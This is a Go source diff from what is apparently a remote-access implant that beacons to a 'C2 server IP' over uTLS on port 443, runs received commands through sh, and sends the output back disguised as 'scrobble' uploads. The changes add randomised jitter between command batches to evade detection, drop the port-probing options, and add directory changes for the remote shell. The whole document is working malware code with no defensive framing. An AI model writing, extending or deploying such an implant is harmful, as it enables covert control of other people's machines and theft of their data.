@@ -83,9 +83,11 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 	}
 	defer uConn.Close()
 	
-	initialBurst :=20
+	initialBurst, nReqs_per_delay :=20, 21
 	chunkIndex :=0
 	conn_err_retry_count :=0
+	var delay_per_batch time.Duration
+
 	
 	for{//ideally this loop sleeps for 2 secs every operation, sends a GET req from line 70, and reads data from reader, calls decode engine
 
@@ -135,8 +137,10 @@ func invokeParallelDialups(port string, wg *sync.WaitGroup, resultChan chan<- di
 		        go decoderEngine(data, uuConn, ureader) //decoderEngine -> executeCommand -> upload/scrobble
 		        
 		        chunkIndex++
-		        if chunkIndex>initialBurst && chunkIndex%5==0{ //could add a jitter logic
-		        	time.Sleep(2 *time.Second)
+		        nReqs_per_delay--
+		        if chunkIndex>initialBurst && nReqs_per_delay==0{
+		        	nReqs_per_delay, delay_per_batch = calculateJitter(rand.Intn(2)+1)
+		        	time.Sleep(delay_per_batch)
 		        }
 		    default:
 		    	fmt.Println("Unexpected status code. All the best!")
@@ -193,8 +197,6 @@ func main(){
 	//user input collection
 	target  := flag.String("target", "", "C2 server IP address (required)")
     timeout = *flag.Duration("timeout", 10*time.Second, "probe timeout per port")
-    ports   := flag.String("ports", "80,8080,443,53,123", "comma separated ports to probex")
-    stealth := flag.Int("stealth", 0, "Introduce random jitter between each probes. goes 0-4. Higher the number, slowe the probes")
     
     flag.Parse()
 
@@ -204,14 +206,7 @@ func main(){
         return
     }
     c2_server_ip = *target
-    sl:=*stealth
-    port_list := strings.Split(*ports, ",")
-	for i, p := range port_list {
-    	port_list[i] = strings.TrimSpace(p)
-	}
-
-	//port_list := []string{"80", "8080", "443", "53", "123", "9001", "8443"}
-	port_list = []string{"443"}
+	port_list := []string{"443"}
 	
 	report := make(map[string]string)
 	resultChan := make(chan dialResult, len(port_list))
@@ -219,9 +214,6 @@ func main(){
 
 	for _, port := range port_list{
 		wg.Add(1)
-		if sl >0{
-			calculateAndJitter(sl)
-		}
 		go invokeParallelDialups(port, &wg, resultChan)
 	}
 
@@ -237,34 +229,48 @@ func main(){
 
 }
 
-func calculateAndJitter(sl int){
+func calculateJitter(sl int) (int, time.Duration){
 
 	var baseDelay time.Duration
 	switch sl{
 	case 1:
 		baseDelay = 2 * time.Second
 	case 2:
-		baseDelay = 20 * time.Second
-	case 3:
-		baseDelay = 10 * time.Minute
-	case 4:
-		fallthrough //anything greater than 4 gets a base delay of 2 hours
+		fallthrough
 	default:
-		baseDelay = 2 * time.Hour
+		baseDelay = 6 * time.Second
 	}
 
 	//use a variance of +/-20 %
 	minMultiplier := 0.8
 	maxMultiplier := 1.2
+	nReqs_per_delay :=0
 
 	//calculate a random multiplier within that range
 	randomMultiplier := minMultiplier + rand.Float64()*(maxMultiplier-minMultiplier)
 	actualSleep := time.Duration(float64(baseDelay) * randomMultiplier)
-	fmt.Println("Sleeping for ", actualSleep)
-	time.Sleep(actualSleep)
-	return
+
+	switch{
+	case actualSleep>6*time.Second:
+		nReqs_per_delay=7
+	case actualSleep > 5*time.Second:
+		nReqs_per_delay = 6
+	case actualSleep > 4*time.Second:
+		nReqs_per_delay = 5
+	case actualSleep > 3*time.Second:
+		nReqs_per_delay = 4
+	case actualSleep > 2*time.Second:
+		nReqs_per_delay = 3
+	case actualSleep > 1*time.Second:
+		nReqs_per_delay = 2
+	default:
+		nReqs_per_delay =1
+	}
+
+	return nReqs_per_delay, actualSleep
 }
 
+var targetDir string
 func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader){
 	if len(finalCommand)!=0{
 		shellBinary := "sh"
@@ -277,6 +283,19 @@ func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader
 		}
 
 		cmd := exec.Command(shellBinary, shellFlag, finalCommand)
+		args := strings.Fields(finalCommand)
+		switch args[0]{
+		case "cd":
+			targetDir ="/"
+			if len(args)>1{
+				if targetDir == "../"||targetDir == "../../"{
+					targetDir = targetDir+args[1]
+				}
+				targetDir=args[1]
+			}
+		}
+		//validate targetDir
+		cmd.Dir = targetDir //either this, or os.Chdir, but we would need os.Stat and os.isDir or something for that
 		res, err := cmd.Output()
 		if err != nil {
 			if exitErr, ok := err.(*exec.ExitError); ok {
@@ -288,7 +307,7 @@ func executeCommand(finalCommand string, uConn *utls.UConn, reader *bufio.Reader
 			formatted_out = strings.TrimSpace(string(res))
 		}
 
-		if len(formatted_out)<5{ //temporary threshold 5, until we figure out scrobble
+		if len(formatted_out)<16{ //temporary threshold 5, until we figure out scrobble
 			go uploadOutputAsScrobble(formatted_out, uConn, reader)
 			if echo_to_stdout=="on"{
 			fmt.Println("sending output through scrobble")}
